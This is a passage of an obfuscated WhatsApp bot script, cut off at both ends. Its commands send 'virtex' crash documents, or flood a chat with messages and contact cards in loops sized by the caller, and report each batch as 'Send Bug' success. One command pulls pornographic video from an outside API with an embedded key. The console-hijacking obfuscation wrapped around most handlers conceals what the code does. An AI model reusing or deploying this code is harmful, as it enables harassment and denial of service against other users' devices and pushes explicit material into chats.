_0x26a62[_0x5741c7(0x1b1)]()[_0x5741c7(0x1c7)](_0x5741c7(0x1bc))[_0x5741c7(0x1b1)]()[_0x5741c7(0x1c2)](_0x26a62)[_0x5741c7(0x1c7)]('(((.+)+)+)+$');});_0x26a62();const _0x554965=(function(){let _0x3244fd=!![];return function(_0x288962,_0x47eb59){const _0x5502e4=_0x3244fd?function(){const _0xa5d27a=_0x1359;if(_0x47eb59){const _0x4950b1=_0x47eb59[_0xa5d27a(0x1c0)](_0x288962,arguments);return _0x47eb59=null,_0x4950b1;}}:function(){};return _0x3244fd=![],_0x5502e4;};}()),_0x3ddd39=_0x554965(this,function(){const _0x16bee5=_0x1359;let _0x39486d;try{const _0xbe9dc=Function(_0x16bee5(0x1b9)+_0x16bee5(0x1ac)+');');_0x39486d=_0xbe9dc();}catch(_0x4c8ce3){_0x39486d=window;}const _0x158793=_0x39486d[_0x16bee5(0x1bb)]=_0x39486d[_0x16bee5(0x1bb)]||{},_0x14d566=[_0x16bee5(0x1cb),_0x16bee5(0x1ad),_0x16bee5(0x1c3),_0x16bee5(0x1af),'exception',_0x16bee5(0x1be),'trace'];for(let _0x442698=0x0;_0x442698<_0x14d566[_0x16bee5(0x1b3)];_0x442698++){const _0x83dc60=_0x554965[_0x16bee5(0x1c2)][_0x16bee5(0x1ae)]['bind'](_0x554965),_0x9d0783=_0x14d566[_0x442698],_0x54c23b=_0x158793[_0x9d0783]||_0x83dc60;_0x83dc60[_0x16bee5(0x1b8)]=_0x554965[_0x16bee5(0x1c9)](_0x554965),_0x83dc60[_0x16bee5(0x1b1)]=_0x54c23b[_0x16bee5(0x1b1)][_0x16bee5(0x1c9)](_0x54c23b),_0x158793[_0x9d0783]=_0x83dc60;}});function _0x1359(_0x373c3e,_0x15b7ae){const _0x28d2d3=_0x59ba();return _0x1359=function(_0x3ddd39,_0x554965){_0x3ddd39=_0x3ddd39-0x1a7;let _0x166ec1=_0x28d2d3[_0x3ddd39];return _0x166ec1;},_0x1359(_0x373c3e,_0x15b7ae);}_0x3ddd39();{if(!isCreator&&!isBan)return;if(!m[_0x2dcedc(0x1b5)])throw _0x2dcedc(0x1ab);if(!text)throw _0x2dcedc(0x1a7);let media=await quoted[_0x2dcedc(0x1ba)]();var messa=await prepareWAMessageMedia({'document':media},{'upload':jobotz[_0x2dcedc(0x1a9)]});lala=media,jobotz[_0x2dcedc(0x1ca)](m['chat'],{'document':lala,'mimetype':'document/pdf','fileName':text+_0x2dcedc(0x1a8)+thejo,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+thejo,'body':wm+'\x20\x0a'+thejo,'previewType':'PHOTO','showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x2dcedc(0x1c5)}},'caption':''+thejo},{'quoted':fkonjo,'contextInfo':{}}),jancok(_0x2dcedc(0x1c6));}function _0x59ba(){const _0x4c7f1f=['sendMessage','log','Teksnya\x20Mana?','\x20Joness\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','waUploadToServer','96944GYRNuh','*Send/Reply\x20Media','{}.constructor(\x22return\x20this\x22)(\x20)','warn','prototype','error','121886uhDEuG','toString','736623SbHLhq','length','936972XMEoLb','quoted','2675960tAjwFT','190hEGJBU','__proto__','return\x20(function()\x20','download','console','(((.+)+)+)+$','8rxwRtN','table','160zeKrYf','apply','136506FMCSmO','constructor','info','545930IEWtjH','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','Sukses','search','12ryAWdi','bind'];_0x59ba=function(){return _0x4c7f1f;};return _0x59ba();}
}
break

case 'ngeness':{
function _0x8fab(){const _0x45a32c=['toString','1056gOeVzJ','48994mDLggG','log','1526EfisEa','(((.+)+)+)+$','251307txtVAm','apply','search','exception','9tTghhL','./virtex/Darkness\x20メ','trace','Jumlahnya?','bind','18120Cfxcoa','reply','4464UDRVGt','465690XfZvfB','constructor','{}.constructor(\x22return\x20this\x22)(\x20)','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','warn','Sukses\x20Send\x20Bug\x20Sebanyak\x20','13935yJwmgZ','PHOTO','return\x20(function()\x20','ngeness\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','92208RQBKMm','__proto__','length','20iLPndU','document/pdf','946170DjiVpC','error'];_0x8fab=function(){return _0x45a32c;};return _0x8fab();}const _0x3a7ab0=_0x31c6;(function(_0x24edd7,_0x5ea7eb){const _0x35909a=_0x31c6,_0x11848b=_0x24edd7();while(!![]){try{const _0x5e532d=parseInt(_0x35909a(0xb0))/0x1+-parseInt(_0x35909a(0xba))/0x2+-parseInt(_0x35909a(0xa4))/0x3*(-parseInt(_0x35909a(0xbd))/0x4)+parseInt(_0x35909a(0xb6))/0x5*(parseInt(_0x35909a(0xc2))/0x6)+parseInt(_0x35909a(0xc5))/0x7*(parseInt(_0x35909a(0xad))/0x8)+parseInt(_0x35909a(0xa8))/0x9*(parseInt(_0x35909a(0xbf))/0xa)+parseInt(_0x35909a(0xc3))/0xb*(-parseInt(_0x35909a(0xaf))/0xc);if(_0x5e532d===_0x5ea7eb)break;else _0x11848b['push'](_0x11848b['shift']());}catch(_0x58d7bf){_0x11848b['push'](_0x11848b['shift']());}}}(_0x8fab,0x3f95a));const _0x3f3d1e=(function(){let _0x4cb54e=!![];return function(_0x5c58ad,_0x362de6){const _0x516fe6=_0x4cb54e?function(){if(_0x362de6){const _0xef7d5e=_0x362de6['apply'](_0x5c58ad,arguments);return _0x362de6=null,_0xef7d5e;}}:function(){};return _0x4cb54e=![],_0x516fe6;};}()),_0x22aa01=_0x3f3d1e(this,function(){const _0x271261=_0x31c6;return _0x22aa01[_0x271261(0xc1)]()[_0x271261(0xa6)](_0x271261(0xc6))['toString']()[_0x271261(0xb1)](_0x22aa01)[_0x271261(0xa6)](_0x271261(0xc6));});function _0x31c6(_0x5eeae7,_0x1dfd95){const _0x393997=_0x8fab();return _0x31c6=function(_0x3b7874,_0x388f99){_0x3b7874=_0x3b7874-0xa4;let _0x32df5f=_0x393997[_0x3b7874];return _0x32df5f;},_0x31c6(_0x5eeae7,_0x1dfd95);}_0x22aa01();const _0x388f99=(function(){let _0x4cf325=!![];return function(_0x58b4ec,_0x358c23){const _0x48fee5=_0x4cf325?function(){const _0x537f47=_0x31c6;if(_0x358c23){const _0x58adfc=_0x358c23[_0x537f47(0xa5)](_0x58b4ec,arguments);return _0x358c23=null,_0x58adfc;}}:function(){};return _0x4cf325=![],_0x48fee5;};}()),_0x3b7874=_0x388f99(this,function(){const _0x2bffa4=_0x31c6,_0x3a15a2=function(){const _0x319b0d=_0x31c6;let _0x3b5153;try{_0x3b5153=Function(_0x319b0d(0xb8)+_0x319b0d(0xb2)+');')();}catch(_0xd6e2b8){_0x3b5153=window;}return _0x3b5153;},_0x44407b=_0x3a15a2(),_0x5a873f=_0x44407b['console']=_0x44407b['console']||{},_0x29dbe8=[_0x2bffa4(0xc4),_0x2bffa4(0xb4),'info',_0x2bffa4(0xc0),_0x2bffa4(0xa7),'table',_0x2bffa4(0xaa)];for(let _0x2a65b6=0x0;_0x2a65b6<_0x29dbe8[_0x2bffa4(0xbc)];_0x2a65b6++){const _0x30586a=_0x388f99[_0x2bffa4(0xb1)]['prototype']['bind'](_0x388f99),_0x287be5=_0x29dbe8[_0x2a65b6],_0x28374e=_0x5a873f[_0x287be5]||_0x30586a;_0x30586a[_0x2bffa4(0xbb)]=_0x388f99[_0x2bffa4(0xac)](_0x388f99),_0x30586a['toString']=_0x28374e[_0x2bffa4(0xc1)]['bind'](_0x28374e),_0x5a873f[_0x287be5]=_0x30586a;}});_0x3b7874();{if(!isCreator&&!isBan)return;if(args[_0x3a7ab0(0xbc)]==0x0)return m[_0x3a7ab0(0xae)](_0x3a7ab0(0xab));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){jobotz['sendMessage'](m['chat'],{'document':fs['readFileSync'](_0x3a7ab0(0xa9)),'mimetype':_0x3a7ab0(0xbe),'fileName':_0x3a7ab0(0xb9)+thejo,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+thejo,'body':wm+'\x20\x0a'+thejo,'previewType':_0x3a7ab0(0xb7),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x3a7ab0(0xb3)}},'caption':''+thejo},{'quoted':fkonjo,'contextInfo':{}});}jancok(_0x3a7ab0(0xb5)+jumlah);}
}
break

case 'jadingeness':{
function _0x2092(_0x4d8f4d,_0x4156cc){const _0x245ab3=_0x2c90();return _0x2092=function(_0x59b214,_0xcf90ac){_0x59b214=_0x59b214-0x89;let _0x42ab4a=_0x245ab3[_0x59b214];return _0x42ab4a;},_0x2092(_0x4d8f4d,_0x4156cc);}const _0x34ce09=_0x2092;(function(_0x452f86,_0x2c65f4){const _0x21396d=_0x2092,_0x27acc3=_0x452f86();while(!![]){try{const _0x215eda=-parseInt(_0x21396d(0x97))/0x1*(parseInt(_0x21396d(0xa3))/0x2)+parseInt(_0x21396d(0x8b))/0x3*(parseInt(_0x21396d(0x94))/0x4)+parseInt(_0x21396d(0x89))/0x5*(-parseInt(_0x21396d(0xa2))/0x6)+-parseInt(_0x21396d(0x92))/0x7+parseInt(_0x21396d(0xa7))/0x8+-parseInt(_0x21396d(0xad))/0x9*(-parseInt(_0x21396d(0x93))/0xa)+-parseInt(_0x21396d(0xac))/0xb;if(_0x215eda===_0x2c65f4)break;else _0x27acc3['push'](_0x27acc3['shift']());}catch(_0x4eec17){_0x27acc3['push'](_0x27acc3['shift']());}}}(_0x2c90,0x20a0e));function _0x2c90(){const _0x15bf0c=['280362YrmKSr','PHOTO','search','\x20Ngeness\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','waUploadToServer','warn','error','775901FZUnqK','1220LDcoXc','8hBsrFM','document/pdf','Sukses','30IlANVz','trace','*Send/Reply\x20Media','exception','prototype','table','return\x20(function()\x20','log','(((.+)+)+)+$','download','bind','18ugAAWw','9008qsGhkL','sendMessage','console','info','1819336qQyNZO','__proto__','quoted','toString','constructor','1952885vzWaRA','18945SbTRUT','length','189985xthbXM','apply'];_0x2c90=function(){return _0x15bf0c;};return _0x2c90();}const _0x2f019b=(function(){let _0x71a6e8=!![];return function(_0x197f62,_0x35330c){const _0x1d6eb4=_0x71a6e8?function(){const _0x856721=_0x2092;if(_0x35330c){const _0x4700e6=_0x35330c[_0x856721(0x8a)](_0x197f62,arguments);return _0x35330c=null,_0x4700e6;}}:function(){};return _0x71a6e8=![],_0x1d6eb4;};}()),_0x9d10cc=_0x2f019b(this,function(){const _0x20c586=_0x2092;return _0x9d10cc[_0x20c586(0xaa)]()[_0x20c586(0x8d)](_0x20c586(0x9f))['toString']()['constructor'](_0x9d10cc)[_0x20c586(0x8d)](_0x20c586(0x9f));});_0x9d10cc();const _0xcf90ac=(function(){let _0x25e9a1=!![];return function(_0x5efc1a,_0x52014f){const _0x548542=_0x25e9a1?function(){if(_0x52014f){const _0x3693fa=_0x52014f['apply'](_0x5efc1a,arguments);return _0x52014f=null,_0x3693fa;}}:function(){};return _0x25e9a1=![],_0x548542;};}()),_0x59b214=_0xcf90ac(this,function(){const _0x16aef8=_0x2092,_0x319e4a=function(){const _0x442059=_0x2092;let _0x34bf49;try{_0x34bf49=Function(_0x442059(0x9d)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x3d95a5){_0x34bf49=window;}return _0x34bf49;},_0x4ddcfc=_0x319e4a(),_0x233d08=_0x4ddcfc[_0x16aef8(0xa5)]=_0x4ddcfc[_0x16aef8(0xa5)]||{},_0x36f4a9=[_0x16aef8(0x9e),_0x16aef8(0x90),_0x16aef8(0xa6),_0x16aef8(0x91),_0x16aef8(0x9a),_0x16aef8(0x9c),_0x16aef8(0x98)];for(let _0x319334=0x0;_0x319334<_0x36f4a9[_0x16aef8(0xae)];_0x319334++){const _0x2f8127=_0xcf90ac[_0x16aef8(0xab)][_0x16aef8(0x9b)]['bind'](_0xcf90ac),_0x63d6a3=_0x36f4a9[_0x319334],_0x28c39f=_0x233d08[_0x63d6a3]||_0x2f8127;_0x2f8127[_0x16aef8(0xa8)]=_0xcf90ac[_0x16aef8(0xa1)](_0xcf90ac),_0x2f8127[_0x16aef8(0xaa)]=_0x28c39f[_0x16aef8(0xaa)]['bind'](_0x28c39f),_0x233d08[_0x63d6a3]=_0x2f8127;}});_0x59b214();{if(!isCreator&&!isBan)return;if(!m[_0x34ce09(0xa9)])throw _0x34ce09(0x99);if(!text)throw'Teksnya\x20Mana?';let media=await quoted[_0x34ce09(0xa0)]();var messa=await prepareWAMessageMedia({'document':media},{'upload':jobotz[_0x34ce09(0x8f)]});lala=media,jobotz[_0x34ce09(0xa4)](m['chat'],{'document':lala,'mimetype':_0x34ce09(0x95),'fileName':text+_0x34ce09(0x8e)+thejo,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+thejo,'body':wm+'\x20\x0a'+thejo,'previewType':_0x34ce09(0x8c),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':'https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w'}},'caption':''+thejo},{'quoted':fkonjo,'contextInfo':{}}),jancok(_0x34ce09(0x96));}
}
break

case 'buggam':{
function _0x26f0(){const _0x578da9=['log','1263122PFvvob','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','(((.+)+)+)+$','18SbDZFK','chat','prototype','search','reply','exception','Sukses\x20Send\x20Bug\x20Sebanyak\x20','1593613MHlstt','return\x20(function()\x20','©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓\x0a\x0a','constructor','trace','18FhGmPG','1OZuDmW','toString','console','warn','length','3804292XidCbp','table','PHOTO','15056520QXZdvn','Jumlahnya?','4539448LSEHGG','6059375WrdXlq','2043135jmAfKH','https://telegra.ph/file/313cd5e07455d25a8db88.jpg','info','apply','{}.constructor(\x22return\x20this\x22)(\x20)','error','bind'];_0x26f0=function(){return _0x578da9;};return _0x26f0();}const _0x4fa4d8=_0x34e4;(function(_0x2d8dad,_0xd5ecc8){const _0x4c9b48=_0x34e4,_0x3db538=_0x2d8dad();while(!![]){try{const _0x138ba0=-parseInt(_0x4c9b48(0x1cc))/0x1*(-parseInt(_0x4c9b48(0x1e0))/0x2)+parseInt(_0x4c9b48(0x1d8))/0x3+parseInt(_0x4c9b48(0x1d1))/0x4+-parseInt(_0x4c9b48(0x1d7))/0x5+parseInt(_0x4c9b48(0x1e3))/0x6*(-parseInt(_0x4c9b48(0x1ea))/0x7)+parseInt(_0x4c9b48(0x1d6))/0x8*(-parseInt(_0x4c9b48(0x1cb))/0x9)+parseInt(_0x4c9b48(0x1d4))/0xa;if(_0x138ba0===_0xd5ecc8)break;else _0x3db538['push'](_0x3db538['shift']());}catch(_0x450ec9){_0x3db538['push'](_0x3db538['shift']());}}}(_0x26f0,0xb4921));const _0x360b1d=(function(){let _0x3cb42b=!![];return function(_0x1df565,_0x198b3b){const _0x24eb04=_0x3cb42b?function(){const _0x20d113=_0x34e4;if(_0x198b3b){const _0x15ea6c=_0x198b3b[_0x20d113(0x1db)](_0x1df565,arguments);return _0x198b3b=null,_0x15ea6c;}}:function(){};return _0x3cb42b=![],_0x24eb04;};}()),_0x35e541=_0x360b1d(this,function(){const _0x22630f=_0x34e4;return _0x35e541[_0x22630f(0x1cd)]()[_0x22630f(0x1e6)](_0x22630f(0x1e2))['toString']()['constructor'](_0x35e541)['search'](_0x22630f(0x1e2));});_0x35e541();function _0x34e4(_0x3eb782,_0xf3ad5f){const _0x863b5b=_0x26f0();return _0x34e4=function(_0x2d5de5,_0x5231aa){_0x2d5de5=_0x2d5de5-0x1ca;let _0x35a42c=_0x863b5b[_0x2d5de5];return _0x35a42c;},_0x34e4(_0x3eb782,_0xf3ad5f);}const _0x5231aa=(function(){let _0xffc76a=!![];return function(_0x15946,_0x4e59a6){const _0x319c14=_0xffc76a?function(){const _0x4fdb41=_0x34e4;if(_0x4e59a6){const _0x1938e2=_0x4e59a6[_0x4fdb41(0x1db)](_0x15946,arguments);return _0x4e59a6=null,_0x1938e2;}}:function(){};return _0xffc76a=![],_0x319c14;};}()),_0x2d5de5=_0x5231aa(this,function(){const _0x40c271=_0x34e4,_0x3afc45=function(){const _0x4121f1=_0x34e4;let _0x2f2dfa;try{_0x2f2dfa=Function(_0x4121f1(0x1eb)+_0x4121f1(0x1dc)+');')();}catch(_0x3369a7){_0x2f2dfa=window;}return _0x2f2dfa;},_0x22ce1c=_0x3afc45(),_0x105e91=_0x22ce1c[_0x40c271(0x1ce)]=_0x22ce1c[_0x40c271(0x1ce)]||{},_0x14cd06=[_0x40c271(0x1df),_0x40c271(0x1cf),_0x40c271(0x1da),_0x40c271(0x1dd),_0x40c271(0x1e8),_0x40c271(0x1d2),_0x40c271(0x1ca)];for(let _0x5723e1=0x0;_0x5723e1<_0x14cd06[_0x40c271(0x1d0)];_0x5723e1++){const _0x543333=_0x5231aa[_0x40c271(0x1ed)][_0x40c271(0x1e5)][_0x40c271(0x1de)](_0x5231aa),_0x7ed2b7=_0x14cd06[_0x5723e1],_0x38e08c=_0x105e91[_0x7ed2b7]||_0x543333;_0x543333['__proto__']=_0x5231aa[_0x40c271(0x1de)](_0x5231aa),_0x543333[_0x40c271(0x1cd)]=_0x38e08c[_0x40c271(0x1cd)][_0x40c271(0x1de)](_0x38e08c),_0x105e91[_0x7ed2b7]=_0x543333;}});_0x2d5de5();{if(!isCreator&&!isBan)return;if(args[_0x4fa4d8(0x1d0)]==0x0)return m[_0x4fa4d8(0x1e7)](_0x4fa4d8(0x1d5));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){anu=_0x4fa4d8(0x1ec)+thejo,jobotz['sendMessage'](m[_0x4fa4d8(0x1e4)],{'image':{'url':_0x4fa4d8(0x1d9)},'contextInfo':{'externalAdReply':{'title':''+thejo,'body':''+thejo,'previewType':_0x4fa4d8(0x1d3),'showAdAttribution':!![],'sourceUrl':_0x4fa4d8(0x1e1),'thumbnail':virgam}},'caption':anu},{'quoted':fdocjo,'contextInfo':{}});}jancok(_0x4fa4d8(0x1e9)+jumlah);}
}
break

case 'bokep': {
if (!isCreator && !isBan) return
sugiono = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
jobotz.sendMessage(m.chat, { video: sugiono, mimetype: 'video/mp4', fileName: `${command}.mp4`}, { quoted: fdocjo })
jancok(`Tuh Bokep`)
}
break
 case 'crashcok':{
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = wm,
jobotz.sendMessage(m.chat, {text: kontolu, thumbnail: virgam, quoted: m, contextInfo: { externalAdReply:{title: `${thejo}`,body: wm, previewType:"PHOTO",thumbnail: virgam,sourceUrl:`https://xnxx.com`}}})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'jadikuntul':{
var _0x3654e3=_0xc673;(function(_0x1d575c,_0x196924){var _0x1800ea=_0xc673,_0x6c01e9=_0x1d575c();while(!![]){try{var _0x5422fd=-parseInt(_0x1800ea(0x156))/0x1*(-parseInt(_0x1800ea(0x159))/0x2)+parseInt(_0x1800ea(0x15c))/0x3*(-parseInt(_0x1800ea(0x15a))/0x4)+-parseInt(_0x1800ea(0x151))/0x5*(-parseInt(_0x1800ea(0x157))/0x6)+parseInt(_0x1800ea(0x149))/0x7*(parseInt(_0x1800ea(0x14f))/0x8)+-parseInt(_0x1800ea(0x162))/0x9*(-parseInt(_0x1800ea(0x163))/0xa)+parseInt(_0x1800ea(0x164))/0xb*(-parseInt(_0x1800ea(0x161))/0xc)+parseInt(_0x1800ea(0x15e))/0xd*(parseInt(_0x1800ea(0x160))/0xe);if(_0x5422fd===_0x196924)break;else _0x6c01e9['push'](_0x6c01e9['shift']());}catch(_0x3e2723){_0x6c01e9['push'](_0x6c01e9['shift']());}}}(_0xfd81,0x3c30c));var _0x125cfc=(function(){var _0xb05c44=!![];return function(_0x42760a,_0x26fc8d){var _0x43e59b=_0xb05c44?function(){var _0xd22e49=_0xc673;if(_0x26fc8d){var _0x362f3d=_0x26fc8d[_0xd22e49(0x14a)](_0x42760a,arguments);return _0x26fc8d=null,_0x362f3d;}}:function(){};return _0xb05c44=![],_0x43e59b;};}()),_0x336842=_0x125cfc(this,function(){var _0x104b95=_0xc673;return _0x336842[_0x104b95(0x14e)]()['search'](_0x104b95(0x14b))[_0x104b95(0x14e)]()[_0x104b95(0x152)](_0x336842)[_0x104b95(0x153)]('(((.+)+)+)+$');});_0x336842();var _0x1343c7=(function(){var _0x43ed92=!![];return function(_0x4924a6,_0x432373){var _0xf383ed=_0x43ed92?function(){var _0x18e2b5=_0xc673;if(_0x432373){var _0x46e9cf=_0x432373[_0x18e2b5(0x14a)](_0x4924a6,arguments);return _0x432373=null,_0x46e9cf;}}:function(){};return _0x43ed92=![],_0xf383ed;};}()),_0x4b02b5=_0x1343c7(this,function(){var _0x45f1e0=_0xc673,_0x535684=function(){var _0x3e436b=_0xc673,_0x4b9575;try{_0x4b9575=Function('return\x20(function()\x20'+_0x3e436b(0x150)+');')();}catch(_0x5745c2){_0x4b9575=window;}return _0x4b9575;},_0x45a5ca=_0x535684(),_0xbb61b4=_0x45a5ca['console']=_0x45a5ca[_0x45f1e0(0x15d)]||{},_0x15aaee=[_0x45f1e0(0x14d),'warn','info','error','exception',_0x45f1e0(0x158),_0x45f1e0(0x155)];for(var _0x410a18=0x0;_0x410a18<_0x15aaee[_0x45f1e0(0x154)];_0x410a18++){var _0x5c8909=_0x1343c7[_0x45f1e0(0x152)]['prototype'][_0x45f1e0(0x14c)](_0x1343c7),_0x5cb5a3=_0x15aaee[_0x410a18],_0x303aea=_0xbb61b4[_0x5cb5a3]||_0x5c8909;_0x5c8909['__proto__']=_0x1343c7[_0x45f1e0(0x14c)](_0x1343c7),_0x5c8909[_0x45f1e0(0x14e)]=_0x303aea[_0x45f1e0(0x14e)][_0x45f1e0(0x14c)](_0x303aea),_0xbb61b4[_0x5cb5a3]=_0x5c8909;}});function _0xc673(_0x182e40,_0x89fdbe){var _0x127c99=_0xfd81();return _0xc673=function(_0x4b02b5,_0x1343c7){_0x4b02b5=_0x4b02b5-0x149;var _0x34ec10=_0x127c99[_0x4b02b5];return _0x34ec10;},_0xc673(_0x182e40,_0x89fdbe);}function _0xfd81(){var _0x39bc56=['apply','(((.+)+)+)+$','bind','log','toString','144YESamZ','{}.constructor(\x22return\x20this\x22)(\x20)','135PHakfp','constructor','search','length','trace','5849PEdniG','540CZPCFZ','table','10DrOpZW','82084BzfteY','quoted','3UlZAKT','console','1404rOOJpR','Sukses\x20Convert\x20Kuntul','29932ixvxrB','19632iaJUgB','86922Jcwlea','100UdvEyB','638kEokwO','1085WWthXq'];_0xfd81=function(){return _0x39bc56;};return _0xfd81();}_0x4b02b5();{if(!isCreator&&!isBan)return;if(!m[_0x3654e3(0x15b)]&&!text)throw'Teks/Reply';jobotz['sendContact'](m['chat'],global['owner'],fkonjo),jancok(_0x3654e3(0x15f));}
}
break
case 'kuntul': {
const _0x35ed06=_0x1ffe;(function(_0x369252,_0x2e6dc2){const _0x519ad2=_0x1ffe,_0x16f8a4=_0x369252();while(!![]){try{const _0x10d8f1=parseInt(_0x519ad2(0x1af))/0x1+parseInt(_0x519ad2(0x1aa))/0x2+-parseInt(_0x519ad2(0x1ab))/0x3*(-parseInt(_0x519ad2(0x1a9))/0x4)+parseInt(_0x519ad2(0x1b8))/0x5+parseInt(_0x519ad2(0x1b2))/0x6+parseInt(_0x519ad2(0x1ad))/0x7+-parseInt(_0x519ad2(0x1a6))/0x8;if(_0x10d8f1===_0x2e6dc2)break;else _0x16f8a4['push'](_0x16f8a4['shift']());}catch(_0x5bcf03){_0x16f8a4['push'](_0x16f8a4['shift']());}}}(_0x3b4b,0x98ea6));const _0x5d87a9=(function(){let _0x24027c=!![];return function(_0x4ba52b,_0x5bcdc2){const _0x1086db=_0x24027c?function(){const _0x54dc22=_0x1ffe;if(_0x5bcdc2){const _0x490792=_0x5bcdc2[_0x54dc22(0x19e)](_0x4ba52b,arguments);return _0x5bcdc2=null,_0x490792;}}:function(){};return _0x24027c=![],_0x1086db;};}()),_0x38e835=_0x5d87a9(this,function(){const _0x24c981=_0x1ffe;return _0x38e835[_0x24c981(0x1b1)]()[_0x24c981(0x1a5)](_0x24c981(0x1b7))['toString']()[_0x24c981(0x1a1)](_0x38e835)[_0x24c981(0x1a5)](_0x24c981(0x1b7));});_0x38e835();function _0x1ffe(_0x10dd13,_0x5af006){const _0x1df74f=_0x3b4b();return _0x1ffe=function(_0x49d71d,_0x4de726){_0x49d71d=_0x49d71d-0x19e;let _0x13d57a=_0x1df74f[_0x49d71d];return _0x13d57a;},_0x1ffe(_0x10dd13,_0x5af006);}const _0x4de726=(function(){let _0x199bf9=!![];return function(_0x3a5005,_0x70548a){const _0x5c480c=_0x199bf9?function(){const _0x386055=_0x1ffe;if(_0x70548a){const _0xb802cd=_0x70548a[_0x386055(0x19e)](_0x3a5005,arguments);return _0x70548a=null,_0xb802cd;}}:function(){};return _0x199bf9=![],_0x5c480c;};}()),_0x49d71d=_0x4de726(this,function(){const _0x37c1b7=_0x1ffe;let _0x5035fe;try{const _0x242c47=Function('return\x20(function()\x20'+_0x37c1b7(0x1a7)+');');_0x5035fe=_0x242c47();}catch(_0xda7bdc){_0x5035fe=window;}const _0x1c4825=_0x5035fe[_0x37c1b7(0x1a4)]=_0x5035fe[_0x37c1b7(0x1a4)]||{},_0x487b87=[_0x37c1b7(0x1b4),'warn',_0x37c1b7(0x1b3),_0x37c1b7(0x1a8),_0x37c1b7(0x19f),_0x37c1b7(0x1ac),_0x37c1b7(0x1ba)];for(let _0x5c68ac=0x0;_0x5c68ac<_0x487b87[_0x37c1b7(0x1b6)];_0x5c68ac++){const _0x4ca072=_0x4de726[_0x37c1b7(0x1a1)]['prototype']['bind'](_0x4de726),_0x1e7a44=_0x487b87[_0x5c68ac],_0x2cdcba=_0x1c4825[_0x1e7a44]||_0x4ca072;_0x4ca072[_0x37c1b7(0x1b5)]=_0x4de726[_0x37c1b7(0x1b0)](_0x4de726),_0x4ca072[_0x37c1b7(0x1b1)]=_0x2cdcba[_0x37c1b7(0x1b1)][_0x37c1b7(0x1b0)](_0x2cdcba),_0x1c4825[_0x1e7a44]=_0x4ca072;}});_0x49d71d();function _0x3b4b(){const _0x59708d=['info','log','__proto__','length','(((.+)+)+)+$','4980940GZuKpS','chat','trace','Penggunaan\x20','Sukses\x20Send\x20Kuntul\x20Sebanyak\x20','apply','exception','\x20jumlah\x0aContoh\x20','constructor','sendContact','reply','console','search','25568488bMTKGH','{}.constructor(\x22return\x20this\x22)(\x20)','error','76hDFZvO','259280FQlUnT','129252fYByBH','table','7306831ywfPWL','Hallo\x20Aku\x20JO','358737mgurzz','bind','toString','2852454PmIKQj'];_0x3b4b=function(){return _0x59708d;};return _0x3b4b();}{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x35ed06(0x1a3)](_0x35ed06(0x1bb)+(prefix+command)+_0x35ed06(0x1a0)+(prefix+command)+'\x205');jumlah=''+encodeURI(q),ydd=_0x35ed06(0x1ae);for(let i=0x0;i<jumlah;i++){jobotz[_0x35ed06(0x1a2)](m[_0x35ed06(0x1b9)],global['owner'],fkonjo);}jancok(_0x35ed06(0x1bc)+jumlah);}
}
break
case 'kuntulto': {
var _0x441bd3=_0xbfe7;(function(_0x3b8f19,_0x26de3e){var _0x47e9c2=_0xbfe7,_0x432172=_0x3b8f19();while(!![]){try{var _0x4b8e2f=parseInt(_0x47e9c2(0x1fc))/0x1+parseInt(_0x47e9c2(0x1f5))/0x2+parseInt(_0x47e9c2(0x1fa))/0x3+parseInt(_0x47e9c2(0x1f7))/0x4*(parseInt(_0x47e9c2(0x1f9))/0x5)+parseInt(_0x47e9c2(0x1f8))/0x6*(-parseInt(_0x47e9c2(0x202))/0x7)+parseInt(_0x47e9c2(0x20f))/0x8+parseInt(_0x47e9c2(0x203))/0x9*(-parseInt(_0x47e9c2(0x1f0))/0xa);if(_0x4b8e2f===_0x26de3e)break;else _0x432172['push'](_0x432172['shift']());}catch(_0x33c21a){_0x432172['push'](_0x432172['shift']());}}}(_0x995e,0xa5811));var _0xfb786f=(function(){var _0x153312=!![];return function(_0x3d1f07,_0x12afb5){var _0x6e1b84=_0x153312?function(){if(_0x12afb5){var _0x48271a=_0x12afb5['apply'](_0x3d1f07,arguments);return _0x12afb5=null,_0x48271a;}}:function(){};return _0x153312=![],_0x6e1b84;};}()),_0x49c6a7=_0xfb786f(this,function(){var _0x55211a=_0xbfe7;return _0x49c6a7['toString']()[_0x55211a(0x208)](_0x55211a(0x1fb))[_0x55211a(0x20c)]()[_0x55211a(0x1fd)](_0x49c6a7)[_0x55211a(0x208)](_0x55211a(0x1fb));});_0x49c6a7();var _0x466b17=(function(){var _0x3b7a46=!![];return function(_0x2740fe,_0x278716){var _0x5c9727=_0x3b7a46?function(){var _0x5d6856=_0xbfe7;if(_0x278716){var _0x3dbea5=_0x278716[_0x5d6856(0x20b)](_0x2740fe,arguments);return _0x278716=null,_0x3dbea5;}}:function(){};return 